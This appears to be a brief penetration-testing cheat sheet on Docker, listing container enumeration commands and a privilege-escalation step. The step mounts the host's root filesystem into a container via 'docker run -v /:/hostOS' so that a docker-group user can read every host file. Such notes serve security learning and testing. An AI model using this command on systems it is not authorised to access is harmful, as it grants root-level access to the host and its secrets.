# Docker

## Enumeration

View running containers:

`docker ps`

find local docker images:

`docker image ls`

Check if we are inside a container by running \(if the file exists we are inside a docker\):

`ls -la /.dockerenv`

\`\`

## Privilege escalation

If we have a user which is part of the `docker` group we can mount the file system to the docker and see all files

mount the file system:

`docker run -v /:/hostOS -i -t [image name] bash`

* `-v /:/hostOS` - mount the host’s `/` as `/hostOS` inside the image
* `-i` - interactive
* `-t` - create a tty
* `[image name]` - the name of the image to run, got from `docker ps above`
* `bash` - command to run

